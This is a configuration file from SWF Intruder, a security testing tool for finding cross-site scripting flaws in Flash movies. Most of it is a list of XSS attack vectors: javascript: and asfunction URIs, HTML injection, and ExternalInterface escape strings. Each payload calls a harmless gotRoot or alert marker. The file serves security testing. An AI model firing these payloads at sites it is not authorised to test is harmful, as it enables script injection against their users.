/*************************************************
** Config.js
** Global Variables
**
**  This file is part of SWF Intruder
**  Author: Stefano Di Paola (stefano.dipaola@mindedsecurity.com)
**  Copyright: Minded Security © 2007
**  License: GPL 2.0
**
*/

var evilsite= location.href.substring(0, location.href.lastIndexOf('/'))+ "/payloads/";
var seconds=5; // Time to wait for SWF to be loaded while testing for XSS.
var alertWhenFound=true; // if true popup an alert box when Xss is found
var miniSwf=true; // improve detection of Xss by using direct embed for swf
var showXssDiv=true; // improve detection of Xss by using direct embed for swf
var showDebugDiv=false; // improve detection of Xss by using direct embed for swf
var maxHistoryElements=3;
var useAllVariables=false; // use all the variables that are defined in the Variables panel with their default values

/************
**  Attack Patterns.
**  If you want to include the name of the fuzzed parameter somewhere,
**  use %%NAME%%.
*/
// var attackVector=['asfunction:getURL,javascript:gotRoot("%%NAME%%")///d.jpg', // Direct load 
// 		 // the '!' char is used to separate the affected parameter in gotRoot function
// 		  evilsite+'xss.swf?!%%NAME%%',  // controlled Evil Page
// 		  evilsite, // Controlled evil Host
// 		  "\x22\x27><img src='asfunction:getURL,javascript:gotRoot(\x22%%NAME%%\x22)//.jpg\x27 >dss", // Flash Html Injection
// 		  "(gotRoot(\x22%%NAME%%\x22))", // Dom Injection
// 		  "\x22\x27|!$%&/)=" // js/flash error
// 		  ];
var attackVector=[''];

function loadAttackVector(){
	attackVector=[evilsite+"/"+document.location+"?%%NAME%%", // Direct load
		  "javascript:if(window.opener)window.opener.gotRoot(/%%NAME%%/);else alert(/%%NAME%%/)///img.jpg", // Direct load 
		  "javascript:if(window.opener)window.opener.gotRoot(/%%NAME%%/);else alert(/%%NAME%%/)///img.swf", // Direct load
		  "javascript:if(window.opener)window.opener.gotRoot(/%%NAME%%/);else alert(/%%NAME%%/)///img.mp4", // Direct load
		  "javascript:if(window.opener)window.opener.gotRoot(/%%NAME%%/);else alert(/%%NAME%%/)///img.mp3", // Direct load
		  "javasjavascript:cript:if(window.opener)window.opener.gotRoot(/%%NAME%%/);else alert(/%%NAME%%/)///img.jpg", // Direct load 
		  "asfunction:getURL,javascript:if(window.opener)window.opener.gotRoot(/%%NAME%%/);else alert(/%%NAME%%/)///img.jpg", //AS2
		  "asfunction:getURL,javascript:if(window.opener)window.opener.gotRoot(/%%NAME%%/);else alert(/%%NAME%%/)///img.swf", //AS2
		  "asfunction:getURL,javascript:if(window.opener)window.opener.gotRoot(/%%NAME%%/);else alert(/%%NAME%%/)///img.mp4", //AS2
		  "asfunction:getURL,javascript:if(window.opener)window.opener.gotRoot(/%%NAME%%/);else alert(/%%NAME%%/)///img.mp3", //AS2
		  "<img src='asfunction:getURL,javascript:if(window.opener)window.opener.gotRoot(/%%NAME%%/);else alert(/%%NAME%%/)//.jpg'>///img.jpg", //AS2
		  "getURL,javascript:if(window.opener)window.opener.gotRoot(/%%NAME%%/);else alert(/%%NAME%%/)", //AS2
		  "navigateToURL,javascript:if(window.opener)window.opener.gotRoot(/%%NAME%%/);else alert(/%%NAME%%/)", //AS3
		  // the '!' char is used to separate the affected parameter in gotRoot function
		  evilsite+"xss.swf?"+Math.random()+"!%%NAME%%",  // controlled Evil Page
		  evilsite+"skull_and_crossbones_large.jpg?"+Math.random()+"!%%NAME%%//img.jpg",  // controlled Evil Page
		  evilsite+"skull_and_crossbones_large.png?"+Math.random()+"!%%NAME%%//img.png",  // controlled Evil Page
		  evilsite+"ok.xml?"+Math.random()+"!%%NAME%%//xml.xml",  // controlled Evil Page
		  evilsite+"error.xml?"+Math.random()+"!%%NAME%%//xml.xml",  // controlled Evil Page
		  evilsite+"not_found_file_no_no.jpg?"+Math.random()+"!%%NAME%%//notfound.jpg",  // controlled Evil Page
		  evilsite, // Controlled evil Host
		  "\x22\x27><img src=\x22javascript:gotRoot(/%%NAME%%/)//img.jpg\x22 >dss", // Flash Html Injection
		  "(gotRoot(/%%NAME%%/))", // Dom Injection
		  "#javascript:gotRoot(/%%NAME%%/)",
		  "#gotRoot(/%%NAME%%/)",
		  "#getURL(javascript:gotRoot(/%%NAME%%/))", //AS2
		  "#asfunction:getURL,javascript:gotRoot(/%%NAME%%/)//", //AS2
		  "#getURL,javascript:gotRoot(/%%NAME%%/)", //AS2
		  "#goto,javascript:gotRoot(/%%NAME%%/)", //AS2
		  "#navigateToURL,javascript:gotRoot(/%%NAME%%/)", //AS3
		  "#<font color='#2288FF' size='30'><b><a href='javascript:alert(/%%NAME%%/);gotRoot(/%%NAME%%/);'>Click here for XSS!</a></b>",
		  ":\\\"-gotRoot(/%%NAME%%/)-\";", // External Interface Exploit
		  ":\\'-gotRoot(/%%NAME%%/)-';", // External Interface Exploit
		  ":\\\"-gotRoot(/%%NAME%%/)}catch(e){gotRoot(/%%NAME%%/)}//;", // External Interface Exploit
		  ":\\'-gotRoot(/%%NAME%%/)}catch(e){gotRoot(/%%NAME%%/)}//;", // External Interface Exploit
		  ":\\\")-gotRoot(/%%NAME%%/)}catch(e){gotRoot(/%%NAME%%/)}//;", // External Interface Exploit
		  ":\\')-gotRoot(/%%NAME%%/)}catch(e){gotRoot(/%%NAME%%/)}//;", // External Interface Exploit
		  ":\\\"))-gotRoot(/%%NAME%%/)}catch(e){gotRoot(/%%NAME%%/)}//;", // External Interface Exploit
		  ":\\'))-gotRoot(/%%NAME%%/)}catch(e){gotRoot(/%%NAME%%/)}//;", // External Interface Exploit
		  ":\\\")))-gotRoot(/%%NAME%%/)}catch(e){gotRoot(/%%NAME%%/)}//;", // External Interface Exploit
		  ":\\')))-gotRoot(/%%NAME%%/)}catch(e){gotRoot(/%%NAME%%/)}//;", // External Interface Exploit
		  ":\"-gotRoot(/%%NAME%%/)-\";", // External Interface Exploit
		  ":'-gotRoot(/%%NAME%%/)-';", // External Interface Exploit
		  ":\"-gotRoot(/%%NAME%%/)}catch(e){gotRoot(/%%NAME%%/)}//;", // External Interface Exploit
		  ":'-gotRoot(/%%NAME%%/)}catch(e){gotRoot(/%%NAME%%/)}//;", // External Interface Exploit
		  ":\")-gotRoot(/%%NAME%%/)}catch(e){gotRoot(/%%NAME%%/)}//;", // External Interface Exploit
		  ":')-gotRoot(/%%NAME%%/)}catch(e){gotRoot(/%%NAME%%/)}//;", // External Interface Exploit
		  ":\"))-gotRoot(/%%NAME%%/)}catch(e){gotRoot(/%%NAME%%/)}//;", // External Interface Exploit
		  ":'))-gotRoot(/%%NAME%%/)}catch(e){gotRoot(/%%NAME%%/)}//;", // External Interface Exploit
		  ":\")))-gotRoot(/%%NAME%%/)}catch(e){gotRoot(/%%NAME%%/)}//;", // External Interface Exploit
		  ":')))-gotRoot(/%%NAME%%/)}catch(e){gotRoot(/%%NAME%%/)}//;", // External Interface Exploit
		  "/*:/**/gotRoot(/%%NAME%%/)//;", // External Interface Exploit
		  "\\\"%%NAME%%(){};", // js/flash error
		  "\\\'%%NAME%%(){};", // js/flash error
		  "\"'|!$%&/)%%NAME%%=", // js/flash error
		  "\"'}]<x%%NAME%%=", // js/flash error
		  ")}catch(e){};gotRoot(/%%NAME%%/);//",
		  "gotRoot(/%%NAME%%/)",
		  ";gotRoot(/%%NAME%%/);",
		  "');gotRoot(/%%NAME%%/);//",
		  "\");gotRoot(/%%NAME%%/);//",
		  "'));gotRoot(/%%NAME%%/);//",
		  "\"));gotRoot(/%%NAME%%/);//",
		  "')));gotRoot(/%%NAME%%/);//",
		  "\")));gotRoot(/%%NAME%%/);//",
		  "-gotRoot(/%%NAME%%/)-1",
		  "\"-gotRoot(/%%NAME%%/)-\"",
		  "\'-gotRoot(/%%NAME%%/)-\'",
		  "\")-gotRoot(/%%NAME%%/)-(\"",
		  "\')-gotRoot(/%%NAME%%/)-(\'",
		  "\"))-gotRoot(/%%NAME%%/)-((\"",
		  "\'))-gotRoot(/%%NAME%%/)-((\'",
		  "\")))-gotRoot(/%%NAME%%/)-(((\"",
		  "\')))-gotRoot(/%%NAME%%/)-(((\'",
		  "\"])}catch(e){if(!window.intruder_x0){window.intruder_x0=1;gotRoot(/%%NAME%%/)}}//",
		  "\'])}catch(e){if(!window.intruder_x1){window.intruder_x1=1;gotRoot(/%%NAME%%/)}}//",
		  "\"]))}catch(e){if(!window.intruder_x2){window.intruder_x2=1;gotRoot(/%%NAME%%/)}}//",
		  "\']))}catch(e){if(!window.intruder_x3){window.intruder_x3=1;gotRoot(/%%NAME%%/)}}//",
		  "\"])))}catch(e){if(!window.intruder_x4){window.intruder_x4=1;gotRoot(/%%NAME%%/)}}//",
		  "\'])))}catch(e){if(!window.intruder_x5){window.intruder_x5=1;gotRoot(/%%NAME%%/)}}//",
		  "<font color='#2288FF' size='30'><b><a href='javascript:alert(/%%NAME%%/);gotRoot(/%%NAME%%/);'>Click here for XSS!</a></b>",
		  "<tags><font color='#2288FF' size='30'><b><a href='javascript:alert(/%%NAME%%/);gotRoot(/%%NAME%%/);'>Click here for XSS!</a></b></tags>"
		  ];
};
loadAttackVector();

